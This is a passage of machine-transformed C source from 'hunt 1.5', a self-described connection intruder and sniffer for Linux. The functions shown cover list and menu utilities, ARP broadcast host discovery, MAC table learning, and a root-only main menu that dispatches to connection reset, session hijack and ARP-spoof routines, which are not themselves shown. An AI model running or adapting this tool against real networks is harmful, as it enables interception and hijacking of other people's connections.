    return_value___bswap_32_4=__bswap_32_link7(addr);
    unsigned int return_value___bswap_32_5;
    return_value___bswap_32_5=__bswap_32_link7(hui->start_addr);
    idx = return_value___bswap_32_4 - return_value___bswap_32_5;
    if(!(promisc == ((signed int *)NULL)))
      tmp_if_expr_7 = promisc[(signed long int)idx] != 0 ? (_Bool)1 : (_Bool)0;

    else
      tmp_if_expr_7 = (_Bool)0;
    if(tmp_if_expr_7)
      tmp_if_expr_10 = (_Bool)1;

    else
    {
      if(promisc == ((signed int *)NULL))
      {
        if(!(hui->promisc_ping[(signed long int)idx] == 0))
          tmp_if_expr_8 = (_Bool)1;

        else
          tmp_if_expr_8 = hui->promisc_arp[(signed long int)idx] != 0 ? (_Bool)1 : (_Bool)0;
        tmp_if_expr_9 = tmp_if_expr_8 ? (_Bool)1 : (_Bool)0;
      }

      else
        tmp_if_expr_9 = (_Bool)0;
      tmp_if_expr_10 = tmp_if_expr_9 ? (_Bool)1 : (_Bool)0;
    }
    if(tmp_if_expr_10)
    {
      char *return_value_host_lookup_6;
      return_value_host_lookup_6=host_lookup(addr, 1);
      printf("in PROMISC MODE  %s\n", return_value_host_lookup_6);
    }

    return_value___bswap_32_3=__bswap_32_link7(addr);
    addr=__bswap_32_link7(return_value___bswap_32_3 + (unsigned int)1);
  }
  while((_Bool)1);
}

// list_host_up
// file hostup.c line 195
static void list_host_up(struct host_up_info *hui, signed int *up)
{
  unsigned int addr;
  unsigned int idx;
  addr = hui->start_addr;
  unsigned int return_value___bswap_32_1;
  unsigned int return_value___bswap_32_2;
  _Bool tmp_if_expr_7;
  _Bool tmp_if_expr_10;
  _Bool tmp_if_expr_9;
  _Bool tmp_if_expr_8;
  unsigned int return_value___bswap_32_3;
  do
  {
    return_value___bswap_32_1=__bswap_32_link7(addr);
    return_value___bswap_32_2=__bswap_32_link7(hui->end_addr);
    if(!(return_value___bswap_32_2 >= return_value___bswap_32_1))
      break;

    unsigned int return_value___bswap_32_4;
    return_value___bswap_32_4=__bswap_32_link7(addr);
    unsigned int return_value___bswap_32_5;
    return_value___bswap_32_5=__bswap_32_link7(hui->start_addr);
    idx = return_value___bswap_32_4 - return_value___bswap_32_5;
    if(!(up == ((signed int *)NULL)))
      tmp_if_expr_7 = up[(signed long int)idx] != 0 ? (_Bool)1 : (_Bool)0;

    else
      tmp_if_expr_7 = (_Bool)0;
    if(tmp_if_expr_7)
      tmp_if_expr_10 = (_Bool)1;

    else
    {
      if(up == ((signed int *)NULL))
      {
        if(!(hui->up_ping[(signed long int)idx] == 0))
          tmp_if_expr_8 = (_Bool)1;

        else
          tmp_if_expr_8 = hui->up_arp[(signed long int)idx] != 0 ? (_Bool)1 : (_Bool)0;
        tmp_if_expr_9 = tmp_if_expr_8 ? (_Bool)1 : (_Bool)0;
      }

      else
        tmp_if_expr_9 = (_Bool)0;
      tmp_if_expr_10 = tmp_if_expr_9 ? (_Bool)1 : (_Bool)0;
    }
    if(tmp_if_expr_10)
    {
      char *return_value_host_lookup_6;
      return_value_host_lookup_6=host_lookup(addr, 1);
      printf("UP  %s\n", return_value_host_lookup_6);
    }

    return_value___bswap_32_3=__bswap_32_link7(addr);
    addr=__bswap_32_link7(return_value___bswap_32_3 + (unsigned int)1);
  }
  while((_Bool)1);
}

// list_init
// file c/list.c line 16
void list_init(struct list *l, signed int next_offset)
{
  l->l_last = (void *)0;
  l->l_first = l->l_last;
  l->l_off = next_offset;
  l->l_iter = (struct list_iterator *)(void *)0;
  l->l_produce_done = 0;
  l->l_locked = 0;
  pthread_mutex_init(&l->l_mutex, (const union anonymous_9 *)(void *)0);
  pthread_cond_init(&l->l_notempty, (const union anonymous_9 *)(void *)0);
  l->l_locked_thr = (unsigned long int)0;
}

// list_insert_at
// file c/list.c line 88
void list_insert_at(struct list *l, signed int nr, void *m)
{
  void **p;
  __lock(l);
  p = &l->l_first;
  signed int tmp_post_1;
  for( ; !(*p == NULL); p = &(*((void **)((char *)*p + (signed long int)l->l_off))))
  {
    tmp_post_1 = nr;
    nr = nr - 1;
    if(tmp_post_1 == 0)
      break;

  }
  *((void **)((char *)m + (signed long int)l->l_off)) = *p;
  if(!(*p == NULL))
    *p = m;

  else
    __enqueue(l, m);
  __update_iterators(l, *((void **)((char *)m + (signed long int)l->l_off)), m);
  __unlock(l);
}

// list_iter_end
// file c/list.h line 91
void list_iter_end(struct list_iterator *i)
{
  struct list_iterator **p;
  struct list *l = i->i_list;
  __lock(l);
  p = &l->l_iter;
  for( ; !(*p == ((struct list_iterator *)NULL)); p = &(*p)->i_next)
    if(*p == i)
    {
      *p = i->i_next;
      break;
    }

  __unlock(l);
  i->i_cur = (void *)0;
  i->i_next = (struct list_iterator *)(void *)0;
  i->i_list = (struct list *)(void *)0;
}

// list_iter_get
// file c/list.h line 90
void * list_iter_get(struct list_iterator *i)
{
  void *retval;
  struct list *l = i->i_list;
  __lock(l);
  retval = i->i_cur;
  if(!(retval == NULL))
    i->i_cur = *((void **)((char *)retval + (signed long int)l->l_off));

  __unlock(l);
  return retval;
}

// list_iter_set
// file c/list.h line 89
void list_iter_set(struct list_iterator *i, struct list *l)
{
  __lock(l);
  i->i_list = l;
  i->i_cur = l->l_first;
  i->i_next = l->l_iter;
  l->l_iter = i;
  __unlock(l);
}

// list_lock
// file c/list.h line 86
void list_lock(struct list *l)
{
  _Bool tmp_if_expr_2;
  unsigned long int return_value_pthread_self_1;
  if(l->l_locked == 0)
    tmp_if_expr_2 = (_Bool)1;

  else
  {
    return_value_pthread_self_1=pthread_self();
    tmp_if_expr_2 = l->l_locked_thr != return_value_pthread_self_1 ? (_Bool)1 : (_Bool)0;
  }
  if(tmp_if_expr_2)
  {
    pthread_mutex_lock(&l->l_mutex);
    l->l_locked_thr=pthread_self();
    l->l_locked = 1;
  }

  else
    l->l_locked = l->l_locked + 1;
}

// list_peek
// file c/list.c line 216
void * list_peek(struct list *l)
{
  void *retval;
  __lock(l);
  retval = l->l_first;
  __unlock(l);
  return retval;
}

// list_pop
// file c/list.h line 76
void * list_pop(struct list *l)
{
  void *retval;
  __lock(l);
  retval=__pop(l);
  __unlock(l);
  return retval;
}

// list_produce
// file c/list.h line 71
void list_produce(struct list *l, void *m)
{
  __lock(l);
  __enqueue(l, m);
  pthread_cond_signal(&l->l_notempty);
  __unlock(l);
}

// list_produce_done
// file c/list.c line 130
void list_produce_done(struct list *l)
{
  __lock(l);
  l->l_produce_done = 1;
  pthread_cond_signal(&l->l_notempty);
  __unlock(l);
}

// list_produce_start
// file c/list.h line 72
void list_produce_start(struct list *l)
{
  __lock(l);
  l->l_produce_done = 0;
  __unlock(l);
}

// list_push
// file c/list.h line 69
void list_push(struct list *l, void *m)
{
  __lock(l);
  *((void **)((char *)m + (signed long int)l->l_off)) = l->l_first;
  if(*((void **)((char *)m + (signed long int)l->l_off)) == NULL)
    l->l_last = m;

  __update_iterators(l, l->l_first, m);
  l->l_first = m;
  __unlock(l);
}

// list_remove
// file c/list.h line 81
void * list_remove(struct list *l, void *m)
{
  void *return_value___list_remove_1;
  return_value___list_remove_1=__list_remove(l, __func_remove, m);
  return return_value___list_remove_1;
}

// list_remove_at
// file c/list.c line 295
void * list_remove_at(struct list *l, signed int nr)
{
  void *return_value___list_remove_1;
  return_value___list_remove_1=__list_remove(l, __func_remove_at, (void *)nr);
  return return_value___list_remove_1;
}

// list_remove_func
// file c/list.c line 300
void * list_remove_func(struct list *l, signed int (*func)(signed int, void *, void *), void *m)
{
  void *return_value___list_remove_1;
  return_value___list_remove_1=__list_remove(l, func, m);
  return return_value___list_remove_1;
}

// list_unlock
// file c/list.h line 87
void list_unlock(struct list *l)
{
  l->l_locked = l->l_locked - 1;
  if(l->l_locked == 0)
    pthread_mutex_unlock(&l->l_mutex);

}

// log2
// file util.c line 73
signed int log2(unsigned int i)
{
  signed int l = 0;
  if(i == 0u)
    return -1;

  else
  {
    for( ; (1u & i) == 0u; i = i >> 1)
      l = l + 1;
    i = i >> 1;
    if(!(i == 0u))
      return 0;

    else
      return l;
  }
}

// logo
// file main.c line 23
void logo(void)
{
  printf("/*\n *\thunt 1.5\n *\tmultipurpose connection intruder / sniffer for Linux\n *\t(c) 1998-2000 by kra\n */\n");
}

// mac_arp_learn
// file hunt.c line 685
static void mac_arp_learn(struct packet *p)
{
  unsigned int ip;
  char *mac;
  struct arpeth_hdr *arpethh = (struct arpeth_hdr *)(p->p_arph + (signed long int)1);
  unsigned short int tmp_statement_expression_3;
  unsigned short int mac_arp_learn__1__1____v;
  unsigned short int mac_arp_learn__1__1____x = (unsigned short int)2;
  asm("rorw _8, %w0" : "=r"(mac_arp_learn__1__1____v) : "0"(mac_arp_learn__1__1____x) : "cc");
  tmp_statement_expression_3 = mac_arp_learn__1__1____v;
  _Bool tmp_if_expr_5;
  unsigned short int tmp_statement_expression_4;
  if(p->p_arph->ar_op == tmp_statement_expression_3)
    tmp_if_expr_5 = (_Bool)1;

  else
  {
    unsigned short int __v;
    unsigned short int __x = (unsigned short int)1;
    asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
    tmp_statement_expression_4 = __v;
    tmp_if_expr_5 = p->p_arph->ar_op == tmp_statement_expression_4 ? (_Bool)1 : (_Bool)0;
  }
  char *return_value_host_lookup_1;
  if(tmp_if_expr_5)
  {
    ip = *((unsigned int *)arpethh->ar_sip);
    mac = (char *)arpethh->ar_sha;
    signed int return_value_memcmp_2;
    return_value_memcmp_2=memcmp((const void *)mac, (const void *)p->p_ethh->h_source, (unsigned long int)6);
    if(return_value_memcmp_2 == 0)
      mac_table_update(ip, mac);

    else
    {
      return_value_host_lookup_1=host_lookup(ip, hl_mode);
      fprintf(stderr, "ARP: MAC src != ARP src for host %s\n", return_value_host_lookup_1);
    }
  }

}

// mac_disc_menu
// file hunt.h line 577
void mac_disc_menu(void)
{
  char *m_menu = "s/k)   start/stop daemon\nl)     list discoverer setup     h) list HW mac addresses\nt)     time to sleep\na/m/d) add/mod/del entry\nx)     return\n";
  char *m_keys = "sklhtadmx";
  signed int run_it = 1;
  while(!(run_it == 0))
  {
    signed int return_value_menu_1;
    return_value_menu_1=menu("mac disc. daemon", m_menu, "macd", m_keys, (char)0);
    switch(return_value_menu_1)
    {
      case 115:
      {
        start_mac_discovery();
        break;
      }
      case 107:
      {
        stop_mac_discovery();
        break;
      }
      case 108:
      {
        mdi_list();
        break;
      }
      case 104:
      {
        print_mac_table();
        break;
      }
      case 116:
      {
        mdi_time_wait();
        break;
      }
      case 97:
      {
        mdi_add();
        break;
      }
      case 109:
      {
        mdi_mod();
        break;
      }
      case 100:
      {
        mdi_del();
        break;
      }
      case 120:
        run_it = 0;
    }
  }
}

// mac_disc_thr
// file macdisc.c line 81
static void * mac_disc_thr(void *arg)
{
  struct list_iterator li;
  struct mac_disc_info *mdi;
  unsigned int addr;
  struct timeval tv;
  struct timespec ts;
  signed int retval;
  pthread_sigmask(0, &intr_mask, (struct anonymous_3 *)(void *)0);
  signed int return_value_getpid_1;
  return_value_getpid_1=getpid();
  setpriority(0, (unsigned int)return_value_getpid_1, 10);
  stop_break = 0;
  void *return_value_list_iter_get_2;
  unsigned int return_value___bswap_32_3;
  unsigned int return_value___bswap_32_4;
  unsigned int return_value___bswap_32_5;
  while(stop == 0)
  {
    list_iter_set(&li, &l_mdi);
    do
    {
      return_value_list_iter_get_2=list_iter_get(&li);
      mdi = (struct mac_disc_info *)return_value_list_iter_get_2;
      if(mdi == ((struct mac_disc_info *)NULL))
        break;

      if(!(stop == 0))
        break;

      addr = mdi->start_addr;
      do
      {
        return_value___bswap_32_3=__bswap_32_link4(addr);
        return_value___bswap_32_4=__bswap_32_link4(mdi->end_addr);
        if(!(stop == 0) || !(return_value___bswap_32_4 >= return_value___bswap_32_3))
          break;

        mac_discover(addr, 1);
        return_value___bswap_32_5=__bswap_32_link4(addr);
        addr=__bswap_32_link4(return_value___bswap_32_5 + (unsigned int)1);
      }
      while((_Bool)1);
    }
    while((_Bool)1);
    list_iter_end(&li);
    pthread_mutex_lock(&mutex_stop);
    retval = 0;
    gettimeofday(&tv, (struct timezone *)(void *)0);
    ts.tv_sec = tv.tv_sec + (signed long int)wait_sec;
    ts.tv_nsec = tv.tv_usec * (signed long int)1000;
    while(stop == 0 && stop_break == 0 && !(retval == 110))
      retval=pthread_cond_timedwait(&cond_stop, &mutex_stop, &ts);
    pthread_mutex_unlock(&mutex_stop);
    stop_break = 0;
  }
  return (void *)0;
}

// mac_discover
// file macdisc.c line 34
void mac_discover(unsigned int ip, signed int count)
{
  struct arp_spec as;
  struct timespec ts;
  signed int i;
  as.src_mac = (char *)my_eth_mac;
  as.dst_mac = (char *)mac_broadcast;
  unsigned short int tmp_statement_expression_1;
  unsigned short int __v;
  unsigned short int __x = (unsigned short int)1;
  asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
  tmp_statement_expression_1 = __v;
  as.oper = (signed int)tmp_statement_expression_1;
  as.sender_mac = (char *)my_eth_mac;
  as.sender_addr = (unsigned long int)my_eth_ip;
  as.target_mac = (char *)mac_zero;
  as.target_addr = (unsigned long int)ip;
  ts.tv_sec = (signed long int)0;
  ts.tv_nsec = (signed long int)100000000;
  i = 0;
  for( ; !(i >= count); i = i + 1)
  {
    send_arp_packet(&as);
    if(!(i >= count + -1))
      nanosleep(&ts, (struct timespec *)(void *)0);

  }
}

// mac_discover_range
// file macdisc.c line 17
void mac_discover_range(unsigned int start_ip, unsigned int end_ip, signed int count)
{
  unsigned int addr;
  unsigned int j;
  struct timespec ts;
  j = (unsigned int)1;
  unsigned int return_value___bswap_32_1;
  unsigned int return_value___bswap_32_2;
  unsigned int return_value___bswap_32_3;
  for( ; (unsigned int)count >= j; j = j + 1u)
  {
    addr = start_ip;
    do
    {
      return_value___bswap_32_1=__bswap_32_link4(addr);
      return_value___bswap_32_2=__bswap_32_link4(end_ip);
      if(!(return_value___bswap_32_2 >= return_value___bswap_32_1))
        break;

      mac_discover(addr, 1);
      return_value___bswap_32_3=__bswap_32_link4(addr);
      addr=__bswap_32_link4(return_value___bswap_32_3 + (unsigned int)1);
    }
    while((_Bool)1);
    ts.tv_sec = (signed long int)0;
    ts.tv_nsec = (signed long int)200000000;
    nanosleep(&ts, (struct timespec *)(void *)0);
  }
}

// mac_info_get
// file hunt.c line 668
struct mac_info * mac_info_get(unsigned int ip)
{
  struct mac_info *mi;
  hash_lock(&mac_table);
  void *return_value_hash_get_1;
  return_value_hash_get_1=hash_get(&mac_table, ip, (void *)0);
  mi = (struct mac_info *)return_value_hash_get_1;
  if(!(mi == ((struct mac_info *)NULL)))
    pthread_mutex_lock(&mi->mutex);

  hash_unlock(&mac_table);
  return mi;
}

// mac_info_release
// file hunt.c line 680
void mac_info_release(struct mac_info *mi)
{
  pthread_mutex_unlock(&mi->mutex);
}

// mac_ip_learn
// file hunt.c line 704
static void mac_ip_learn(struct packet *p)
{
  unsigned int ip;
  char *mac;
  ip = p->p_iph->saddr;
  mac = (char *)p->p_ethh->h_source;
  mac_table_update(ip, mac);
}

// mac_learn_from_ip_opt
// file options.c line 74
static void mac_learn_from_ip_opt(void)
{
  signed int return_value_menu_choose_char_1;
  return_value_menu_choose_char_1=menu_choose_char("Learn MAC from IP traffic", "yn", (char)(mac_learn_from_ip == 0 ? 110 : 121));
  switch(return_value_menu_choose_char_1)
  {
    case 121:
    {
      mac_learn_from_ip = 1;
      break;
    }
    case 110:
      mac_learn_from_ip = 0;
  }
}

// mac_table_update
// file hunt.c line 647
static void mac_table_update(unsigned int ip, char *mac)
{
  struct mac_info *mi;
  hash_lock(&mac_table);
  void *return_value_hash_get_3;
  return_value_hash_get_3=hash_get(&mac_table, ip, (void *)0);
  mi = (struct mac_info *)return_value_hash_get_3;
  if(!(mi == ((struct mac_info *)NULL)))
  {
    signed int return_value_memcmp_1;
    return_value_memcmp_1=memcmp((const void *)mi->mac, (const void *)mac, sizeof(char [6l]) /*6ul*/ );
    if(!(return_value_memcmp_1 == 0))
    {
      pthread_mutex_lock(&mi->mutex);
      memcpy((void *)mi->mac, (const void *)mac, sizeof(char [6l]) /*6ul*/ );
      pthread_mutex_unlock(&mi->mutex);
    }

  }

  else
  {
    void *return_value_malloc_2;
    return_value_malloc_2=malloc(sizeof(struct mac_info) /*48ul*/ );
    mi = (struct mac_info *)return_value_malloc_2;
    /* assertion mi */
    assert(mi != ((struct mac_info *)NULL));
    memcpy((void *)mi->mac, (const void *)mac, sizeof(char [6l]) /*6ul*/ );
    pthread_mutex_init(&mi->mutex, (const union anonymous_9 *)(void *)0);
    hash_put(&mac_table, ip, (void *)mi);
  }
  hash_unlock(&mac_table);
}

// main
// file main.c line 460
signed int main(signed int argc, char **argv)
{
  struct user_conn_info uci;
  struct sigaction sac;
  signed int run_it;
  signed int c;
  signed int skfd;
  struct ifreq my_ifreq;
  signed int r;
  unsigned int return_value_geteuid_1;
  return_value_geteuid_1=geteuid();
  _Bool tmp_if_expr_3;
  unsigned int return_value_getuid_2;
  if(!(return_value_geteuid_1 == 0u))
    tmp_if_expr_3 = (_Bool)1;

  else
  {
    return_value_getuid_2=getuid();
    tmp_if_expr_3 = return_value_getuid_2 != 0u ? (_Bool)1 : (_Bool)0;
  }
  if(tmp_if_expr_3)
  {
    fprintf(stderr, "UID or EUID of 0 needed\n");
    exit(1);
  }

  main_thread_id=pthread_self();
  do
  {
    c=getopt(argc, argv, "vVi:");
    if(c == -1)
      break;

    switch(c)
    {
      case 105:
      {
        eth_device = optarg;
        break;
      }
      case 118:
      {
        verbose = verbose + 1;
        break;
      }
      case 86:
      {
        printf("hunt: version 1.5\n");
        exit(0);
      }
      default:
      {
        usage(argv[(signed long int)0]);
        exit(1);
      }
    }
  }
  while((_Bool)1);
  skfd=socket(2, 2, 0);
  if(skfd == -1)
  {
    fprintf(stderr, "IPv4 not supported\n");
    exit(1);
  }

  memset((void *)&my_ifreq, 0, sizeof(struct ifreq) /*40ul*/ );
  __builtin_strncpy(my_ifreq.ifr_ifrn.ifrn_name, eth_device, (unsigned long int)16);
  r=ioctl(skfd, (unsigned long int)0x8913, &my_ifreq);
  if(!((1 & (signed int)my_ifreq.ifr_ifru.ifru_flags) == 1) && !(r == -1))
  {
    fprintf(stderr, "Network interface %s is down\n", eth_device);
    exit(1);
  }

  signed int return_value_ioctl_4;
  return_value_ioctl_4=ioctl(skfd, (unsigned long int)0x8915, &my_ifreq);
  if(return_value_ioctl_4 == -1)
  {
    fprintf(stderr, "Network interface %s does not have an ip address\n", eth_device);
    exit(1);
  }

  close(skfd);
  sigemptyset(&intr_mask);
  sigaddset(&intr_mask, 2);
  signed int return_value_getpid_5;
  return_value_getpid_5=getpid();
  setpriority(0, (unsigned int)return_value_getpid_5, 0);
  sac.__sigaction_handler.sa_handler = finish_c_handler;
  sigemptyset(&sac.sa_mask);
  sigaddset(&sac.sa_mask, 2);
  sac.sa_flags = 0x10000000;
  sigaction(2, &sac, (struct sigaction *)(void *)0);
  logo();
  resolv_init();
  timer_init();
  init_modules();
  signed int return_value_pthread_create_6;
  return_value_pthread_create_6=pthread_create(&th_hunt, (const union pthread_attr_t *)(void *)0, hunt, (void *)0);
  if(!(return_value_pthread_create_6 == 0))
    exit(1);

  pthread_mutex_lock(&mutex_hunt_ready);
  while(hunt_ready == 0)
    pthread_cond_wait(&cond_hunt_ready, &mutex_hunt_ready);
  pthread_mutex_unlock(&mutex_hunt_ready);
  atexit(main_reset);
  atexit(tty_atexit);
  atexit(timer_done);
  atexit(resolv_done);
  run_it = 1;
  signed int return_value_choose_connection_8;
  signed int return_value_arpspoof_exit_check_9;
  signed int return_value_menu_choose_char_10;
  while(!(run_it == 0))
  {
    signed int return_value_menu_7;
    return_value_menu_7=menu("Main Menu", main_menu, (char *)(void *)0, main_menu_opt, (char)0);
    switch(return_value_menu_7)
    {
      case 108:
      {
        list_connections();
        break;
      }
      case 114:
      {
        reset_connection();
        break;
      }
      case 115:
      {
        simple_hijack();
        break;
      }
      case 97:
      {
        a_hijack();
        break;
      }
      case 119:
      {
        return_value_choose_connection_8=choose_connection(&uci);
        if(return_value_choose_connection_8 == 0)
          dump_connection(&uci);

        break;
      }
      case 117:
      {
        host_up();
        break;
      }
      case 100:
      {
        choose_daemon();
        break;
      }
      case 111:
      {
        options_menu();
        break;
      }
      case 120:
      {
        return_value_arpspoof_exit_check_9=arpspoof_exit_check();
        if(!(return_value_arpspoof_exit_check_9 == 0))
          break;

        return_value_menu_choose_char_10=menu_choose_char("exit? y/n", "yn", (char)121);
        if(return_value_menu_choose_char_10 == 121)
          run_it = 0;

      }
    }
  }
  return 0;
}

// main_reset
// file main.c line 441
void main_reset(void)
{
  tap(eth_device, 0);
  fprintf(stdout, "\033[0;0;0m");
  printf("\ndone\n");
}

// mdi_add
// file macdisc.c line 182
static void mdi_add(void)
{
  struct mac_disc_info *mdi;
  unsigned int start_ip;
  unsigned int end_ip;
  start_ip=menu_choose_hostname("start ip addr", (char *)(void *)0);
  if(!(start_ip == 4294967295u))
  {
    end_ip=menu_choose_hostname("end ip addr", (char *)(void *)0);
    if(!(end_ip == 4294967295u))
    {
      void *return_value_malloc_1;
      return_value_malloc_1=malloc(sizeof(struct mac_disc_info) /*16ul*/ );
      mdi = (struct mac_disc_info *)return_value_malloc_1;
      /* assertion mdi */
      assert(mdi != ((struct mac_disc_info *)NULL));
      mdi->start_addr = start_ip;
      mdi->end_addr = end_ip;
      list_enqueue(&l_mdi, (void *)mdi);
    }

  }

}

// mdi_del
// file macdisc.c line 218
static void mdi_del(void)
{
  signed int i;
  struct mac_disc_info *mdi;
  mdi_list();
  signed int return_value_list_count_1;
  return_value_list_count_1=list_count(&l_mdi);
  i=menu_choose_unr("item nr. to delete", 0, return_value_list_count_1 - 1, -1);
  if(i >= 0)
  {
    void *return_value_list_remove_at_2;
    return_value_list_remove_at_2=list_remove_at(&l_mdi, i);
    mdi = (struct mac_disc_info *)return_value_list_remove_at_2;
    free((void *)mdi);
  }

}

// mdi_list
// file macdisc.c line 165
static void mdi_list(void)
{
  struct list_iterator li;
  struct mac_disc_info *mdi;
  signed int count = 0;
  list_iter_set(&li, &l_mdi);
  void *return_value_list_iter_get_1;
  signed int tmp_post_2;
  do
  {
    return_value_list_iter_get_1=list_iter_get(&li);
    mdi = (struct mac_disc_info *)return_value_list_iter_get_1;
    if(mdi == ((struct mac_disc_info *)NULL))
      break;

    tmp_post_2 = count;
    count = count + 1;
    char *return_value_host_lookup_3;
    return_value_host_lookup_3=host_lookup(mdi->start_addr, hl_mode);
    char *return_value_host_lookup_4;
    return_value_host_lookup_4=host_lookup(mdi->end_addr, hl_mode);
    printf("%2d) %-24s - %-24s\n", tmp_post_2, return_value_host_lookup_3, return_value_host_lookup_4);
    if(count % lines_o == 0)
      lines_o_press_key();

  }
  while((_Bool)1);
  list_iter_end(&li);
}

// mdi_mod
// file macdisc.c line 198
static void mdi_mod(void)
{
  struct mac_disc_info *mdi;
  unsigned int start_ip;
  unsigned int end_ip;
  signed int nr;
  mdi_list();
  signed int return_value_list_count_1;
  return_value_list_count_1=list_count(&l_mdi);
  signed int return_value_list_count_2;
  return_value_list_count_2=list_count(&l_mdi);
  nr=menu_choose_unr("choose item", 0, return_value_list_count_1 - 1, return_value_list_count_2 - 1);
  if(!(nr == -1))
  {
    void *return_value_list_at_3;
    return_value_list_at_3=list_at(&l_mdi, nr);
    mdi = (struct mac_disc_info *)return_value_list_at_3;
    if(!(mdi == ((struct mac_disc_info *)NULL)))
    {
      char *return_value_host_lookup_4;
      return_value_host_lookup_4=host_lookup(mdi->start_addr, hl_mode);
      start_ip=menu_choose_hostname("start ip addr", return_value_host_lookup_4);
      if(!(start_ip == 4294967295u))
      {
        char *return_value_host_lookup_5;
        return_value_host_lookup_5=host_lookup(mdi->end_addr, hl_mode);
        end_ip=menu_choose_hostname("end ip addr", return_value_host_lookup_5);
        if(!(end_ip == 4294967295u))
        {
          mdi->start_addr = start_ip;
          mdi->end_addr = end_ip;
        }

      }

    }

  }

}

// mdi_time_wait
// file macdisc.c line 232
static void mdi_time_wait(void)
{
  signed int min;
  signed int sec;
  min = wait_sec / 60;
  sec = wait_sec % 60;
  min=menu_choose_unr("choose time interval min", 0, 1000, min);
  if(!(min == -1))
  {
    sec=menu_choose_unr("choose time interval sec", 0, 10000, sec);
    if(!(sec == -1))
    {
      wait_sec = min * 60 + sec;
      stop_break = 1;
      pthread_mutex_lock(&mutex_stop);
      pthread_cond_signal(&cond_stop);
      pthread_mutex_unlock(&mutex_stop);
    }

  }

}

// memfind
// file sniff.c line 261
char * memfind(char *data, signed int data_len, char *str, signed int str_len)
{
  char *d;
  if(data_len == 0 || str_len == 0 || !(data_len >= str_len))
    return (char *)(void *)0;

  else
  {
    while(data_len >= str_len)
    {
      void *return_value_memchr_2;
      return_value_memchr_2=memchr((const void *)data, (signed int)str[(signed long int)0], (unsigned long int)((data_len - str_len) + 1));
      d = (char *)return_value_memchr_2;
      if(!(d == ((char *)NULL)))
      {
        signed int return_value_memcmp_1;
        return_value_memcmp_1=memcmp((const void *)d, (const void *)str, (unsigned long int)str_len);
        if(return_value_memcmp_1 == 0)
          return d;

        data_len = data_len - (signed int)((d - data) + (signed long int)1);
        data = d + (signed long int)1;
      }

      else
        break;
    }
    return (char *)(void *)0;
  }
}

// menu
// file hunt.h line 361
signed int menu(char *head, char *str_menu, char *label, char *opt, char dfl)
{
  if(head == ((char *)NULL))
    head = "";

  if(str_menu == ((char *)NULL))
    str_menu = "";

  set_tty_color_bg((enum TTY_COLOR)COLOR_BLACK, (enum TTY_COLOR)COLOR_WHITE);
  signed int return_value_packet_count_1;
  return_value_packet_count_1=packet_count();
  printf("--- %s --- rcvpkt %u, free/alloc %d/%d ---", head, pkts_received, return_value_packet_count_1, packets_allocated);
  print_rst_daemon();
  print_arp_relayer_daemon();
  print_mac_daemon();
  print_sniff_daemon();
  printf("---");
  set_tty_color_bg((enum TTY_COLOR)COLOR_WHITE, (enum TTY_COLOR)COLOR_BLACK);
  printf("\n");
  if(!(verbose == 0))
  {
    set_tty_color_bg((enum TTY_COLOR)COLOR_BLACK, (enum TTY_COLOR)COLOR_WHITE);
    unsigned long int return_value_strlen_2;
    return_value_strlen_2=strlen(head);
    printf("%*s", return_value_strlen_2 + (unsigned long int)9, (const void *)" ");
    printf("droppkt %u, other proto pkt %u", pkts_dropped, pkts_unhandled);
    set_tty_color_bg((enum TTY_COLOR)COLOR_WHITE, (enum TTY_COLOR)COLOR_BLACK);
    printf("\n");
  }

  printf("%s", str_menu);
  set_tty_color((enum TTY_COLOR)COLOR_LIGHTGRAY);
  if(!(th_hunt == 0ul))
  {
    signed int return_value_pthread_kill_3;
    return_value_pthread_kill_3=pthread_kill(th_hunt, 0);
    if(!(return_value_pthread_kill_3 == 0))
    {
      set_tty_color((enum TTY_COLOR)COLOR_BRIGHTRED);
      printf("hunt failed - please restart the program");
      set_tty_color((enum TTY_COLOR)COLOR_LIGHTGRAY);
    }

  }

  signed int return_value_menu_choose_char_nconn_4;
  return_value_menu_choose_char_nconn_4=menu_choose_char_nconn(label, opt, dfl, 1);
  return return_value_menu_choose_char_nconn_4;
}

// menu_choose_char
// file hunt.h line 358
signed int menu_choose_char(char *label, char *opt, char dfl)
{
  signed int return_value_menu_choose_char_nconn_1;
  return_value_menu_choose_char_nconn_1=menu_choose_char_nconn(label, opt, dfl, 0);
  return return_value_menu_choose_char_nconn_1;
}

// menu_choose_char_nconn
// file menu.c line 406
signed int menu_choose_char_nconn(char *label, char *opt, char dfl, signed int conn_ind)
{
  char buf[64l];
  signed int i;
  while((_Bool)1)
  {
    if(label == ((char *)NULL))
      label = "";

    set_tty_color((enum TTY_COLOR)COLOR_WHITE);
    pthread_mutex_lock(&menucc_mutex);
    menucc_label = label;
    menucc_opt = opt;
    menucc_dfl = dfl;
    menucc_in_menu = 1;
    menucc_conn_ind = conn_ind;
    pthread_mutex_unlock(&menucc_mutex);
    print_new_conn_ind(0);
    fgets(buf, (signed int)sizeof(char [64l]) /*64ul*/ , stdin);
    pthread_mutex_lock(&menucc_mutex);
    menucc_in_menu = 0;
    pthread_mutex_unlock(&menucc_mutex);
    set_tty_color((enum TTY_COLOR)COLOR_LIGHTGRAY);
    if((signed int)buf[0l] == 0x0a)
    {
      if(!(dfl == 0))
      {
        i = (signed int)dfl;
        break;
      }

    }

    if((signed int)buf[0l] == 0x0a)
    {
      i = -1;
      break;
    }

    char *return_value___builtin_strchr_1;
    return_value___builtin_strchr_1=__builtin_strchr(opt, (signed int)buf[(signed long int)0]);
    if(!(return_value___builtin_strchr_1 == ((char *)NULL)))
    {
      i = (signed int)buf[(signed long int)0];
      break;
    }

  }
  return i;
}

// menu_choose_host_mask_ports
// file menu.c line 286
signed int menu_choose_host_mask_ports(char *label, unsigned int *ret_ip, unsigned int *ret_mask, unsigned int *ret_ports, char *dfl)
{
  char buf[256l];
  char *host_name;
  char *mask_str;
  char *ports_str;
  unsigned int ip;
  signed int with_mask;
  signed int mask;
  unsigned int ports[17l];
  while((_Bool)1)
  {
    signed int return_value_menu_prompt_1;
    return_value_menu_prompt_1=menu_prompt(label, buf, (signed int)sizeof(char [256l]) /*256ul*/ , dfl);
    if(!(return_value_menu_prompt_1 >= 0))
      return -1;

    char *return_value___builtin_strchr_2;
    return_value___builtin_strchr_2=__builtin_strchr(buf, 47);
    if(!(return_value___builtin_strchr_2 == ((char *)NULL)))
      with_mask = 1;

    else
      with_mask = 0;
    host_name=strtok(buf, " /\t\n");
    if(!(host_name == ((char *)NULL)))
    {
      ip=parse_hostname(host_name);
      if(!(ip == 4294967295u))
      {
        if(!(with_mask == 0))
        {
          mask_str=strtok((char *)(void *)0, " \t\n");
